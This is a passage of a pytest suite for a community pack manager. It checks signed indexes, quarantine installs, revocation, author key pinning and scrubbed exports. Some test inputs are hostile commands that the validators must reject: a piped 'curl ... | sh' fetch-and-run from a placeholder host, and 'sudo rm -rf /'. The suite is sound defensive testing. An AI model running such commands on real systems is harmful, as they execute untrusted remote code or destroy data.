"""Community zoo: signed index, quarantine install, trust levels and revocation, export, pull request handoff,
CLI and hub (offline: downloads go to a fake session, keys are made at runtime)."""

import base64
import inspect
import json
import os
import shutil
import subprocess
import time
import zipfile
from datetime import date
from pathlib import Path
from types import SimpleNamespace

import pyrage
import pytest
from click.testing import CliRunner
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from orchestrator.Core import community_manager as zoo_mod
from orchestrator.Core import community_pack as cp
from orchestrator.Core.community_manager import CommunityManager, TrustLevel, build_trust_check, submit_contribution
from orchestrator.Core.community_pack import PROVENANCE_NAME, PackError, build_manifest, sign_manifest, write_pack

INDEX_URL = "https://zoo.invalid/index.json"
REPO = "lcf-example/community"
TARGET_YML = """metadata:
  name: Demo Board
  version: 1.2.0
capabilities:
  schema_version: 1
  support_level: community
  boards:
    demo: {label: Demo}
  formats:
    gguf: {label: GGUF, quantizations: [Q4_K_M, Q8_0], default_quantization: Q4_K_M}
"""


# --- helpers ------------------------------------------------------------------------------------------------

class FakeResponse:
    def __init__(self, status, data=b"", url=""):
        self.status_code, self.data, self.url = status, data, url
        self.headers = {"Content-Length": str(len(data))} if status == 200 else {}

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    def iter_content(self, chunk_size=1):
        for i in range(0, len(self.data), chunk_size):
            yield self.data[i:i + chunk_size]


class FakeSession:
    def __init__(self):
        self.files, self.calls, self.redirects = {}, [], {}

    def get(self, url, headers=None, stream=False, timeout=None, allow_redirects=True):
        self.calls.append(url)
        if url not in self.files:
            return FakeResponse(404, url=url)
        return FakeResponse(200, self.files[url], self.redirects.get(url, url))


class FakeSecrets:
    def __init__(self):
        self.store = {}

    def get_secret(self, name):
        return self.store.get(name)

    def set_secret(self, name, value):
        self.store[name] = value
        return True

    def list_secrets(self):
        return list(self.store)


def trusted(key, valid_until="2099-12-31"):
    raw = key.public_key().public_bytes_raw()
    return cp.TrustedKey(key_id=cp.key_id(key.public_key()), pubkey_b64=base64.b64encode(raw).decode(),
                         valid_until=valid_until)


def make_target(root: Path, script: str = "echo build\n", yml: str = TARGET_YML,
                dockerfile: str = "FROM debian:bookworm-slim\nRUN echo ok\n") -> Path:
    (root / "modules").mkdir(parents=True)
    (root / "target.yml").write_text(yml, encoding="utf-8")
    (root / "Dockerfile").write_text(dockerfile, encoding="utf-8")
    (root / "modules" / "build.sh").write_text("#!/bin/bash\n" + script, encoding="utf-8")
    return root


def pack_bytes(root: Path, kind="target", pack_id="demo-board", version="1.2.0", author="alice", key=None) -> bytes:
    manifest = build_manifest(root, kind=kind, id=pack_id, version=version, author=author, license="MIT")
    return write_pack(root, manifest, sign_manifest(manifest, key) if key else None)


class World:
    """An installation folder, a fake network with a signed index, and a community manager."""

    def __init__(self, tmp_path: Path):
        self.tmp = tmp_path
        self.root = tmp_path / "install"
        (self.root / "targets").mkdir(parents=True)
        self.maintainer = Ed25519PrivateKey.generate()
        self.session = FakeSession()
        self.secrets = FakeSecrets()
        self.values = {"community_index_url": INDEX_URL, "community_repo": REPO, "targets_dir": "targets"}
        self.config = SimpleNamespace(get=lambda k, d=None: self.values.get(k, d), user_state_dir=tmp_path / "state")
        self.rag = SimpleNamespace(records=[], ingested=[])
        self.rag.export_records = lambda: iter(self.rag.records)
        self.rag.ingest_document = lambda s, c, m: self.rag.ingested.append((s, c)) or True
        self.framework = SimpleNamespace(info=SimpleNamespace(installation_path=self.root), config=self.config,
                                         resolve_path=lambda v: self.root / v, secrets_manager=self.secrets,
                                         get_component=lambda n: self.rag if n == "rag_manager" else None)
        self.cm = CommunityManager(self.framework, session=self.session, keys=[trusted(self.maintainer)])
        self.entries, self.revoked, self.version = [], [], 1

    def add(self, data: bytes, kind="target", pack_id="demo-board", version="1.2.0", trust="community"):
        url = f"https://zoo.invalid/{kind}/{pack_id}-{version}.zip"
        self.session.files[url] = data
        self.entries.append({"kind": kind, "id": pack_id, "version": version, "author": "alice", "license": "MIT",
                             "trust": trust, "url": url, "size": len(data),
                             "sha256": cp.hashlib.sha256(data).hexdigest(), "title": pack_id.title()})
        return url

    def publish(self, key=None, version=None):
        self.version = version or self.version
        data = json.dumps({"schema_version": 1, "version": self.version, "generated": "2026-10-11T12:00:00Z",
                           "entries": self.entries, "revoked": self.revoked}).encode()
        self.session.files[INDEX_URL] = data
        self.session.files[INDEX_URL + ".sig"] = cp.sign_index(data, key or self.maintainer).model_dump_json().encode()
        return data

    def target_pack(self, name="demo-board", **kw) -> bytes:
        return pack_bytes(make_target(self.tmp / "src" / name, **{k: v for k, v in kw.items()
                                                                  if k in ("script", "yml", "dockerfile")}),
                          pack_id=name, **{k: v for k, v in kw.items() if k in ("author", "key", "version")})

    def install(self, kind="target", pack_id="demo-board", **kw):
        return self.cm.finish_install(self.cm.prepare_install(kind, pack_id, **kw))


@pytest.fixture
def world(tmp_path):
    return World(tmp_path)


# --- index ----------------------------------------------------------------------------------------------------

class TestIndex:

    def test_signed_index_is_fetched_cached_and_listed(self, world):
        world.add(world.target_pack())
        world.publish()
        state = world.cm.load_index(refresh=True)
        assert state.source == "fetched" and state.index.version == 1
        assert (world.cm.cache_dir / "index.json.sig").is_file()
        items = world.cm.list_items(state.index)
        assert [(i.id, i.trust, i.installed_version) for i in items] == [("demo-board", TrustLevel.COMMUNITY, None)]
        world.session.files.clear()
        assert world.cm.load_index().source == "cached", "no network needed once cached"

    @pytest.mark.parametrize("tamper", ["index", "signature", "key"])
    def test_bad_signature_means_no_index_and_the_cache_stays(self, world, tamper):
        world.publish()
        world.cm.load_index(refresh=True)
        cached = (world.cm.cache_dir / "index.json").read_bytes()
        world.entries.append({"kind": "target", "id": "evil", "version": "1.0.0", "author": "x", "license": "MIT",
                              "url": "https://evil.invalid/x.zip", "size": 1, "sha256": "0" * 64})
        world.publish(version=2, key=Ed25519PrivateKey.generate() if tamper == "key" else None)
        if tamper == "index":
            world.session.files[INDEX_URL] = world.session.files[INDEX_URL].replace(b'"version": 2', b'"version": 3')
        elif tamper == "signature":
            sig = json.loads(world.session.files[INDEX_URL + ".sig"])
            sig["sig"] = sig["sig"][:-2] + ("AA" if sig["sig"][-2:] != "AA" else "BB")
            world.session.files[INDEX_URL + ".sig"] = json.dumps(sig).encode()
        with pytest.raises(PackError, match="does not match|not one of the trusted keys|not a valid"):
            world.cm.load_index(refresh=True)
        assert (world.cm.cache_dir / "index.json").read_bytes() == cached

    def test_expired_key_is_refused(self, world):
        world.cm = CommunityManager(world.framework, session=world.session,
                                    keys=[trusted(world.maintainer, valid_until="2020-01-01")])
        world.publish()
        with pytest.raises(PackError, match="expired"):
            world.cm.load_index(refresh=True)

    def test_older_index_is_refused_as_rollback(self, world):
        world.publish(version=5)
        world.cm.load_index(refresh=True)
        world.publish(version=4)
        with pytest.raises(PackError, match="older"):
            world.cm.load_index(refresh=True)
        assert world.cm.cached_index().version == 5

    def test_offline_uses_the_cache(self, world):
        world.publish(version=3)
        world.cm.load_index(refresh=True)
        world.session.files.clear()
        state = world.cm.load_index(refresh=True)
        assert state.source == "cached" and "offline" in state.note

    def test_a_cache_older_than_a_day_is_fetched_again(self, world):
        world.publish()
        world.cm.load_index(refresh=True)
        world.publish(version=2)
        assert world.cm.load_index().index.version == 1, "a fresh cache needs no network"
        old = time.time() - zoo_mod.INDEX_MAX_AGE - 60
        os.utime(world.cm.cache_dir / "index.json", (old, old))
        state = world.cm.load_index()
        assert (state.source, state.index.version) == ("fetched", 2)

    def test_install_always_sees_the_current_revocations(self, world):
        world.add(world.target_pack())
        world.publish()
        world.cm.load_index(refresh=True)  # cached just now, before the revocation
        world.revoked.append({"kind": "target", "id": "demo-board", "reason": "malware"})
        world.publish(version=2)
        with pytest.raises(PackError, match="revoked: malware"):
            world.cm.prepare_install("target", "demo-board")
        del world.session.files[INDEX_URL]  # the index cannot be updated, the pack could be downloaded
        world.session.calls.clear()
        with pytest.raises(PackError, match="could not be updated"):
            world.cm.prepare_install("target", "demo-board")
        assert world.session.calls == [INDEX_URL], "no pack is downloaded with an outdated index"

    def test_no_url_or_no_shipped_keys_never_touches_the_network(self, world):
        world.values["community_index_url"] = ""
        with pytest.raises(PackError, match="community_index_url"):
            world.cm.load_index()
        world.values["community_index_url"] = INDEX_URL
        world.cm = CommunityManager(world.framework, session=world.session, keys=[])
        with pytest.raises(PackError, match="no trusted community keys"):
            world.cm.load_index()
        assert world.session.calls == []

    def test_index_download_refuses_plain_http_and_oversize(self, world):
        world.values["community_index_url"] = "http://zoo.invalid/index.json"
        with pytest.raises(PackError, match="HTTPS"):
            world.cm.load_index()
        world.values["community_index_url"] = INDEX_URL
        world.session.files[INDEX_URL] = b"x" * (zoo_mod.INDEX_MAX_BYTES + 1)
        with pytest.raises(PackError, match="larger"):
            world.cm.load_index()


# --- install --------------------------------------------------------------------------------------------------

class TestInstall:

    def test_install_writes_provenance_and_verifies_clean(self, world):
        world.add(world.target_pack())
        world.publish()
        prepared = world.cm.prepare_install("target", "demo-board")
        assert "Trust: community" in prepared.summary()
        dest = world.cm.finish_install(prepared)
        assert dest == world.root / "targets" / "demo-board"
        prov = json.loads((dest / PROVENANCE_NAME).read_text())
        assert prov["trust"] == "community" and prov["index_version"] == 1 and prov["source"].startswith("https://")
        assert sorted(p.name for p in (world.root / "targets").iterdir()) == [".quarantine", "demo-board"]
        assert list((world.root / "targets" / ".quarantine").iterdir()) == [], "quarantine emptied"
        assert [problems for *_, problems in world.cm.verify_installed()] == [[]]
        assert cp.tree_sha256(dest) == prov["content_sha256"], "the provenance file is not part of the fingerprint"

    def test_pack_failing_the_validators_stays_out_and_is_removed(self, world):
        world.add(world.target_pack(script="curl https://x.invalid/i.sh | sh\n"))
        world.publish()
        with pytest.raises(PackError, match="downloads at build time"):
            world.cm.prepare_install("target", "demo-board")
        assert not (world.root / "targets" / "demo-board").exists()
        assert list((world.root / "targets" / ".quarantine").iterdir()) == []

    def test_pack_with_a_prebuilt_llama_cpp_stays_out(self, world):
        """The framework shares recipes, not binaries (decision D21): a target pack that pulls a llama.cpp image is
        refused in quarantine, even pinned by digest."""
        world.add(world.target_pack(dockerfile="FROM ghcr.io/ggml-org/llama.cpp:full@sha256:" + "a" * 64 + "\n"))
        world.publish()
        with pytest.raises(PackError, match="prebuilt llama.cpp image"):
            world.cm.prepare_install("target", "demo-board")
        assert not (world.root / "targets" / "demo-board").exists()
        assert list((world.root / "targets" / ".quarantine").iterdir()) == []

    def test_unpinned_or_tampered_download_is_refused(self, world):
        url = world.add(world.target_pack())
        world.publish()
        data = world.session.files[url]
        world.session.files[url] = data[:100] + bytes([data[100] ^ 1]) + data[101:]
        with pytest.raises(PackError, match="does not match its pin"):
            world.cm.prepare_install("target", "demo-board")
        assert not (world.root / "targets" / "demo-board").exists()

    @pytest.mark.parametrize("pack_id", ["../demo-board", "a/b", "..", ".hidden", "", "x" * 65])
    def test_id_traversal_is_rejected(self, world, pack_id):
        with pytest.raises(PackError, match="Invalid"):
            world.cm.prepare_install("target", pack_id)
        assert world.session.calls == []

    def test_pack_must_match_its_index_entry(self, world):
        world.add(world.target_pack(name="other-board"), pack_id="demo-board")
        world.publish()
        with pytest.raises(PackError, match="does not match its index entry"):
            world.cm.prepare_install("target", "demo-board")

    def test_rename_is_atomic_and_never_merges(self, world):
        world.add(world.target_pack())
        world.publish()
        prepared = world.cm.prepare_install("target", "demo-board")
        (world.root / "targets" / "Demo-Board").mkdir()  # appeared meanwhile (other case)
        with pytest.raises(PackError, match="already exists"):
            world.cm.finish_install(prepared)
        assert list((world.root / "targets" / "Demo-Board").iterdir()) == []
        assert not prepared.quarantine.exists()

    def test_discard_removes_the_quarantine(self, world):
        world.add(world.target_pack())
        world.publish()
        prepared = world.cm.prepare_install("target", "demo-board")
        world.cm.discard(prepared)
        assert not prepared.quarantine.exists() and not (world.root / "targets" / "demo-board").exists()

    def test_changed_files_are_reported_by_verify(self, world):
        world.add(world.target_pack())
        world.publish()
        dest = world.install()
        (dest / "modules" / "build.sh").write_text("#!/bin/bash\necho changed\n")
        assert world.cm.verify_installed()[0][3] == ["changed since it was installed"]

    def test_file_import_is_local_unless_the_index_lists_it(self, world, tmp_path):
        data = world.target_pack()
        (tmp_path / "pack.zip").write_bytes(data)
        prepared = world.cm.prepare_install_file(tmp_path / "pack.zip")
        assert prepared.trust == TrustLevel.LOCAL and "WARNING" in prepared.summary()
        world.cm.discard(prepared)
        world.add(data, trust="verified")
        world.publish()
        world.cm.load_index(refresh=True)
        assert world.cm.prepare_install_file(tmp_path / "pack.zip").trust == TrustLevel.VERIFIED

    def test_file_import_sees_revocations_of_an_index_newer_than_the_cache(self, world, tmp_path):
        (tmp_path / "pack.zip").write_bytes(world.target_pack())
        world.publish()
        world.cm.load_index(refresh=True)
        world.revoked.append({"kind": "target", "id": "demo-board", "reason": "malware"})
        world.publish(version=2)
        old = time.time() - zoo_mod.INDEX_MAX_AGE - 60
        os.utime(world.cm.cache_dir / "index.json", (old, old))
        with pytest.raises(PackError, match="revoked: malware"):
            world.cm.prepare_install_file(tmp_path / "pack.zip")
        world.session.files.clear()  # offline now: the updated cache keeps the revocation
        with pytest.raises(PackError, match="revoked: malware"):
            world.cm.prepare_install_file(tmp_path / "pack.zip")

    def test_author_signature_is_checked_and_pinned_per_author(self, world, tmp_path):
        alice = Ed25519PrivateKey.generate()
        (tmp_path / "a.zip").write_bytes(world.target_pack(key=alice))
        dest = world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "a.zip"))
        assert json.loads((dest / PROVENANCE_NAME).read_text())["signer"] == cp.key_id(alice.public_key())
        (tmp_path / "b.zip").write_bytes(world.target_pack(name="second", key=Ed25519PrivateKey.generate()))
        notes = world.cm.prepare_install_file(tmp_path / "b.zip").notes
        assert any("WARNING" in n and "before" in n for n in notes), notes

    def test_the_whole_author_key_is_pinned_not_its_short_id(self, world, tmp_path, monkeypatch):
        # A 64-bit key id can be matched by a key made for the purpose; here every key gets the same id.
        monkeypatch.setattr(cp, "key_id", lambda key: "0123456789abcdef")
        (tmp_path / "a.zip").write_bytes(world.target_pack(key=Ed25519PrivateKey.generate()))
        world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "a.zip"))
        (tmp_path / "b.zip").write_bytes(world.target_pack(name="second", key=Ed25519PrivateKey.generate()))
        notes = world.cm.prepare_install_file(tmp_path / "b.zip").notes
        assert any("WARNING" in n and "another key" in n for n in notes), notes

    def test_signature_with_a_foreign_public_key_is_refused(self, world, tmp_path):
        data = world.target_pack(key=Ed25519PrivateKey.generate())
        with zipfile.ZipFile(__import__("io").BytesIO(data)) as zf:
            members = {i.filename: zf.read(i) for i in zf.infolist()}
        sig = json.loads(members["pack.sig"])
        sig["pubkey"] = base64.b64encode(Ed25519PrivateKey.generate().public_key().public_bytes_raw()).decode()
        members["pack.sig"] = json.dumps(sig).encode()
        with zipfile.ZipFile(tmp_path / "x.zip", "w") as zf:
            for name, content in members.items():
                zf.writestr(name, content)
        with pytest.raises(PackError, match="another public key"):
            world.cm.prepare_install_file(tmp_path / "x.zip")

    def test_encrypted_pack_to_my_key(self, world, tmp_path):
        sender = Ed25519PrivateKey.generate()
        me = cp.UserKeys(world.secrets).age_identity()  # what the CLI and the hub open a pack with
        blob = cp.encrypt_pack(world.target_pack(), sender=sender, recipients=[me.to_public()])
        (tmp_path / "x.lcfpack").write_bytes(blob)
        prepared = world.cm.prepare_install_file(tmp_path / "x.lcfpack")
        assert prepared.trust == TrustLevel.LOCAL and prepared.provenance.sender == cp.key_id(sender.public_key())
        world.cm.discard(prepared)
        with pytest.raises(PackError, match="not one of the trusted senders"):
            world.cm.prepare_install_file(tmp_path / "x.lcfpack",
                                          trusted_senders=[Ed25519PrivateKey.generate().public_key()])
        with pytest.raises(PackError, match="not encrypted to your key"):
            world.cm.prepare_install_file(tmp_path / "x.lcfpack", identity=pyrage.x25519.Identity.generate())

    def test_a_passphrase_pack_without_the_passphrase_asks_for_it_and_needs_no_key(self, world, tmp_path):
        blob = cp.encrypt_pack(world.target_pack(), sender=Ed25519PrivateKey.generate(),
                               passphrase="correct horse battery")
        (tmp_path / "x.lcfpack").write_bytes(blob)
        with pytest.raises(PackError, match="protected with a passphrase"):
            world.cm.prepare_install_file(tmp_path / "x.lcfpack")
        assert world.secrets.store == {}, "no age identity is created for a passphrase pack"
        world.framework.secrets_manager = None  # without a secrets store the answer is the same
        with pytest.raises(PackError, match="protected with a passphrase"):
            world.cm.prepare_install_file(tmp_path / "x.lcfpack")
        prepared = world.cm.prepare_install_file(tmp_path / "x.lcfpack", passphrase="correct horse battery")
        assert prepared.trust == TrustLevel.LOCAL

    def test_trusted_senders_are_refused_for_a_plain_pack(self, world, tmp_path):
        (tmp_path / "p.zip").write_bytes(world.target_pack())
        with pytest.raises(PackError, match="only to encrypted packs"):
            world.cm.prepare_install_file(tmp_path / "p.zip",
                                          trusted_senders=[Ed25519PrivateKey.generate().public_key()])
        assert list((world.root / "targets").iterdir()) == []

    def test_the_archive_is_hashed_in_pieces(self, world, monkeypatch):
        data = world.target_pack()
        world.add(data)
        world.publish()
        real = Path.read_bytes

        def read_bytes(path):
            assert path.name != "pack.zip", "the archive (up to 512 MB) must not be read into memory at once"
            return real(path)

        monkeypatch.setattr(Path, "read_bytes", read_bytes)
        prepared = world.cm.prepare_install("target", "demo-board")
        assert prepared.provenance.pack_sha256 == cp.hashlib.sha256(data).hexdigest()

    def test_author_keys_are_pinned_under_the_lock_without_losing_another_writer(self, world, tmp_path):
        import threading
        from orchestrator.utils.file_lock import file_lock

        alice = Ed25519PrivateKey.generate()
        (tmp_path / "a.zip").write_bytes(world.target_pack(key=alice))
        prepared = world.cm.prepare_install_file(tmp_path / "a.zip")
        authors = world.cm.cache_dir / "authors.json"
        with file_lock(world.cm.cache_dir / "authors.json.lock"):  # another process pins a key meanwhile
            worker = threading.Thread(target=world.cm.finish_install, args=(prepared,))
            worker.start()
            worker.join(0.5)
            assert worker.is_alive() and not authors.exists(), "the pin waits for the lock"
            authors.write_text(json.dumps({"bob": "Ym9i"}), encoding="utf-8")
        worker.join(30)
        assert set(json.loads(authors.read_text(encoding="utf-8"))) == {"alice", "bob"}

    def test_recipe_is_checked_against_the_installed_target(self, world, tmp_path):
        from test_recipes import recipe_data
        world.add(world.target_pack())
        world.publish()
        world.install()
        def recipe_pack(fmt, name):
            data = recipe_data()
            data.update(id=name, target={"id": "demo-board", "pack_sha256": "a" * 64}, format=fmt,
                        board="demo", quantization="Q4_K_M")
            root = tmp_path / name
            root.mkdir()
            (root / "recipe.yml").write_text(json.dumps(data))
            (tmp_path / f"{name}.zip").write_bytes(pack_bytes(root, kind="recipe", pack_id=name, version="1.0.0"))
            return tmp_path / f"{name}.zip"
        prepared = world.cm.prepare_install_file(recipe_pack("gguf", "good-recipe"))
        assert any("differs from the one the recipe was built with" in n for n in prepared.notes)
        assert world.cm.finish_install(prepared) == world.root / "community" / "recipes" / "good-recipe"
        with pytest.raises(PackError, match="not available for this target"):
            world.cm.prepare_install_file(recipe_pack("rkllm", "bad-recipe"))

    def test_knowledge_pack_is_ingested_without_changing_its_folder(self, world, tmp_path):
        root = tmp_path / "k"
        root.mkdir()
        (root / "knowledge.json").write_text(json.dumps([{"source": "s", "content": "c", "metadata": {}}]))
        (tmp_path / "k.zip").write_bytes(pack_bytes(root, kind="knowledge", pack_id="notes", version="1.0.0"))
        world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "k.zip"))
        assert world.rag.ingested == [("s", "c")]
        assert [problems for *_, problems in world.cm.verify_installed()] == [[]]
        bad = tmp_path / "bad"
        bad.mkdir()
        (bad / "knowledge.json").write_text('{"not": "a list"}')
        (tmp_path / "bad.zip").write_bytes(pack_bytes(bad, kind="knowledge", pack_id="bad", version="1.0.0"))
        with pytest.raises(PackError, match="expected a list"):
            world.cm.prepare_install_file(tmp_path / "bad.zip")

    def test_a_knowledge_pack_installed_while_the_knowledge_base_is_off_is_imported_when_it_starts(
            self, world, tmp_path, monkeypatch):
        from orchestrator.Core import framework as framework_mod
        world.framework.get_component = lambda name: None  # knowledge base off
        root = tmp_path / "k"
        root.mkdir()
        (root / "knowledge.json").write_text(json.dumps([{"source": "s", "content": "c", "metadata": {}}]))
        (tmp_path / "k.zip").write_bytes(pack_bytes(root, kind="knowledge", pack_id="notes", version="1.0.0"))
        world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "k.zip"))
        assert world.rag.ingested == []
        monkeypatch.setattr(framework_mod, "RAGManager", lambda fm: world.rag)
        framework = SimpleNamespace(rag_manager=None, community_manager=world.cm,
                                    config=SimpleNamespace(get=lambda k, d=None: k == "enable_rag_knowledge" or d))
        assert framework_mod.FrameworkManager.ensure_rag_manager(framework) is world.rag  # the user turns it on
        assert world.rag.ingested == [("s", "c")]
        framework.rag_manager = None
        framework_mod.FrameworkManager.ensure_rag_manager(framework)  # the next start
        assert world.rag.ingested == [("s", "c")], "imported once"

    def test_a_knowledge_pack_the_knowledge_base_refused_is_tried_again(self, world, tmp_path):
        # Started offline without its embedding model, the knowledge base refuses every page (ingest_document
        # returns False); the pack must not count as imported then.
        world.framework.get_component = lambda name: None  # knowledge base off
        root = tmp_path / "k"
        root.mkdir()
        (root / "knowledge.json").write_text(json.dumps([{"source": "s", "content": "c", "metadata": {}},
                                                         {"source": "s2", "content": " ", "metadata": {}}]))
        (tmp_path / "k.zip").write_bytes(pack_bytes(root, kind="knowledge", pack_id="notes", version="1.0.0"))
        world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "k.zip"))
        assert world.cm.sync_knowledge_base(SimpleNamespace(ingest_document=lambda s, c, m: False)) == 0
        # Like the real one: an empty page stores nothing (False), and that is no failure.
        online = SimpleNamespace(ingest_document=lambda s, c, m: bool(c.strip()) and world.rag.ingest_document(s, c, m))
        assert world.cm.sync_knowledge_base(online) == 1 and world.rag.ingested == [("s", "c")]
        assert world.cm.sync_knowledge_base(online) == 0 and world.rag.ingested == [("s", "c")], "imported once"

    def test_a_newer_knowledge_pack_is_ingested_after_the_old_folder_was_deleted(self, world, tmp_path):
        for version, content in (("1.0.0", "old"), ("1.1.0", "new")):
            root = tmp_path / version
            root.mkdir()
            (root / "knowledge.json").write_text(json.dumps([{"source": "s", "content": content, "metadata": {}}]))
            (tmp_path / f"{version}.zip").write_bytes(pack_bytes(root, kind="knowledge", pack_id="notes",
                                                                 version=version))
            dest = world.cm.finish_install(world.cm.prepare_install_file(tmp_path / f"{version}.zip"))
            if version == "1.0.0":
                shutil.rmtree(dest)  # how a pack is removed
        assert world.rag.ingested == [("s", "old"), ("s", "new")]

    def test_knowledge_without_its_source_is_refused(self, world, tmp_path):
        root = tmp_path / "k"
        root.mkdir()
        (root / "knowledge.json").write_text(json.dumps([{"source": " ", "content": "c", "metadata": {}}]))
        (tmp_path / "k.zip").write_bytes(pack_bytes(root, kind="knowledge", pack_id="anon", version="1.0.0"))
        with pytest.raises(PackError, match="each with its source"):
            world.cm.prepare_install_file(tmp_path / "k.zip")


# --- revocation and trust -------------------------------------------------------------------------------------

class TestRevocation:

    def test_revoked_entry_is_blocked(self, world):
        world.add(world.target_pack())
        world.revoked.append({"kind": "target", "id": "demo-board", "reason": "unsafe Dockerfile"})
        world.publish()
        with pytest.raises(PackError, match="revoked: unsafe Dockerfile"):
            world.cm.prepare_install("target", "demo-board")
        assert world.cm.list_items(world.cm.cached_index())[0].trust == TrustLevel.REVOKED

    def test_installed_copy_is_flagged_by_doctor_hub_and_builds(self, world, monkeypatch):
        from orchestrator.Core.doctor import Severity, check_community
        monkeypatch.setattr(zoo_mod, "load_trusted_keys", lambda: [trusted(world.maintainer)])  # the shipped keys
        url = world.add(world.target_pack())
        world.publish()
        dest = world.install()
        assert build_trust_check(dest, world.cm.cache_dir) is None
        world.revoked.append({"kind": "target", "id": "x", "sha256": world.entries[0]["sha256"],
                              "reason": "malware"})
        world.publish(version=2)
        world.cm.load_index(refresh=True)
        assert url  # the revocation names the exact pack by its sha256
        item = world.cm.list_items(world.cm.cached_index())[0]
        assert item.trust == TrustLevel.REVOKED and item.revoked == "malware"
        finding = check_community(SimpleNamespace(community_manager=world.cm))[0]
        assert finding.severity == Severity.ERROR and "revoked" in finding.message
        with pytest.raises(PackError, match="revoked"):
            build_trust_check(dest, world.cm.cache_dir)

    def test_a_revocation_outlives_the_key_that_signed_it(self, world, monkeypatch, qapp):
        from orchestrator.Core.doctor import Severity, check_community
        keys = [trusted(world.maintainer)]
        monkeypatch.setattr(zoo_mod, "load_trusted_keys", lambda: keys)
        world.cm._keys = keys
        world.add(world.target_pack())
        world.publish()
        dest = world.install()
        world.revoked.append({"kind": "target", "id": "demo-board", "reason": "malware"})
        world.publish(version=2)
        world.cm.load_index(refresh=True)
        # Later: the framework was not updated and the key that signed the index has expired since.
        keys[0] = trusted(world.maintainer, valid_until="2025-01-01")
        fetched = cp.datetime(2024, 6, 1, tzinfo=cp.timezone.utc).timestamp()
        os.utime(world.cm.cache_dir / "index.json", (fetched, fetched))
        assert world.cm.cached_index() is None, "nothing is installed from an index with an expired key"
        with pytest.raises(PackError, match="revoked"):
            build_trust_check(dest, world.cm.cache_dir)
        assert check_community(SimpleNamespace(community_manager=world.cm))[0].severity == Severity.ERROR
        listed = json.loads(invoke(world, "list", "--json").stdout)
        assert [(i["id"], i["trust"], i["revoked"]) for i in listed] == [("demo-board", "revoked", "malware")]
        assert world.cm.verify_installed()[0][2] == TrustLevel.REVOKED
        from orchestrator.gui.community_hub import CommunityHubWindow
        hub = CommunityHubWindow(SimpleNamespace(community_manager=world.cm, secrets_manager=world.secrets))
        try:
            wait(hub, qapp)
            assert [(hub.table.item(r, 3).text(), hub.table.cellWidget(r, 6).text())
                    for r in range(hub.table.rowCount())] == [("revoked", "Revoked")]
        finally:
            hub.close()

    def test_every_trust_level_can_occur_and_has_a_hub_colour(self):
        from orchestrator.gui.community_hub import TRUST_COLORS
        assert {t.value for t in TrustLevel} == {"verified", "community", "local", "revoked"} == set(TRUST_COLORS)

    def test_local_target_warns_on_every_build(self, world, tmp_path):
        (tmp_path / "p.zip").write_bytes(world.target_pack())
        dest = world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "p.zip"))
        assert "trust: local" in build_trust_check(dest, world.cm.cache_dir)
        assert build_trust_check(world.tmp, world.cm.cache_dir) is None, "own targets carry no provenance"

    def test_builder_records_the_warning(self, world, tmp_path):
        from orchestrator.Core.builder import BuildEngine
        (tmp_path / "p.zip").write_bytes(world.target_pack())
        dest = world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "p.zip"))
        engine = SimpleNamespace(config=SimpleNamespace(user_state_dir=world.tmp / "state"))
        warnings = []
        BuildEngine._record_target(engine, SimpleNamespace(), SimpleNamespace(add_warning=warnings.append), dest)
        assert any("trust: local" in w for w in warnings)


# --- export ---------------------------------------------------------------------------------------------------

class TestExport:

    def test_target_export_is_scrubbed_signed_and_lists_only_manifest_files(self, world, monkeypatch):
        monkeypatch.setattr("getpass.getuser", lambda: "jenny")
        folder = make_target(world.root / "targets" / "my-board",
                             script="# SDK in /home/jenny/sdk, board at 192.168.7.20\necho build\n")
        (folder / PROVENANCE_NAME).write_text("{}")
        result = world.cm.export_pack("target", "my-board", author="j-board-fan")
        assert result.path.name == "contribution-target-my-board-1.2.0.zip"
        assert [c[0] for c in result.changes] == ["modules/build.sh"] and "192.168.7.20" in result.changes[0][1]
        with zipfile.ZipFile(result.path) as zf:
            names = set(zf.namelist())
            script = zf.read("modules/build.sh").decode()
        assert names == {"pack.json", "pack.sig", "target.yml", "Dockerfile", "modules/build.sh"}
        assert "jenny" not in script and "192.168.7.20" not in script
        contents = cp.read_pack(result.path, world.tmp / "check")
        assert cp.verify_manifest(contents.manifest, contents.signature, [contents.signature.embedded_key()])
        assert world.secrets.store, "signed with the user's key from the secrets store"
        assert CommunityManager(None).verify_file(result.path)[1] == []

    def test_export_refuses_binaries_and_invalid_targets(self, world):
        folder = make_target(world.root / "targets" / "bin-board")
        (folder / "tool.bin").write_bytes(b"\x7fELF\0\0")
        with pytest.raises(PackError, match="binary"):
            world.cm.export_pack("target", "bin-board", author="a")
        make_target(world.root / "targets" / "bad-board", script="sudo rm -rf /\n")
        with pytest.raises(PackError, match="would be rejected"):
            world.cm.export_pack("target", "bad-board", author="a")
        assert not list(world.cm.contributions_dir.glob("*.zip"))

    def test_recipe_export_from_a_build(self, world, tmp_path):
        from test_recipes import build_info
        make_target(world.root / "targets" / "my-board")
        info = build_info(target="my-board", board="demo", format="gguf", quantization="Q4_K_M")
        (tmp_path / "build_info.json").write_text(json.dumps(info))
        result = world.cm.export_pack("recipe", str(tmp_path / "build_info.json"), author="alice")
        with zipfile.ZipFile(result.path) as zf:
            assert set(zf.namelist()) == {"pack.json", "pack.sig", "recipe.yml"}
        assert any("is your own" in n for n in result.notes)

    def test_knowledge_export_only_holds_the_given_sites(self, world):
        world.rag.records = [{"source": "a", "content": "from docs", "metadata": {"root_url": "https://docs.invalid"}},
                             {"source": "b", "content": "private", "metadata": {"root_url": "https://mine.invalid"}}]
        result = world.cm.export_pack("knowledge", author="a", pack_id="board-docs", root_urls=["https://docs.invalid"])
        with zipfile.ZipFile(result.path) as zf:
            assert [e["content"] for e in json.loads(zf.read("knowledge.json"))] == ["from docs"]

    def test_pages_from_installed_knowledge_packs_are_not_exported_as_your_own(self, world):
        world.rag.records = [{"source": "https://docs.invalid/a", "content": "mine", "metadata": {}},
                             {"source": "https://docs.invalid/b", "content": "alice's",
                              "metadata": {"origin_pack": "alice-notes"}}]
        result = world.cm.export_pack("knowledge", author="mallory", pack_id="docs")
        with zipfile.ZipFile(result.path) as zf:
